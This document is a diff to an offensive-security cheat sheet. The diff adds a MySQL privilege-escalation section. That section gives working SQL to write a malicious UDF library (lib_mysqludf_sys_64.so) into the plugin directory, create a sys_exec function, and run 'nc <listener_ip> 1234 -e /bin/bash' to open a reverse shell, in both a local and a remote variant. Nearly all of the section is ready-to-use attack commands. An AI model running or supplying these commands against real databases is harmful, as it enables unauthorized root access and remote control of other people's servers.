@@ -70,9 +70,37 @@ edit line : ExecStart in `/tmp/priv.sh
 reboot
 ```
 
+
+## **MySQL**
+
+Privilege escalation for mysql running as root with mysql root account
+
+- [mysqludf_msf](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql)
+
+```bash
+# Find plugin directory
+SHOW VARIABLES LIKE 'plugin_dir';
+select @@plugin_dir;
+
+# Local method
+use mysql;
+create table tranilment(line blob);
+insert into tranilment values(load_file('/tmp/lib_mysqludf_sys_64.so'));
+select * from tranilment into dumpfile '/<plugin_dir>/lib_mysqludf_sys_64.so';
+create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
+select sys_exec('nc <listener_ip> 1234 -e /bin/bash');
+
+# Remote method
+select "///<listener_ip>/SAHRENAME/lib_mysqludf_sys_64.so" into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys_64.so';
+create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
+select sys_exec('nc <listener_ip> 1234 -e /bin/bash');
+```
+
 ---
 
-## **Debian-ssh**
+
+## **Debian-ssh**
+
 
 - [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
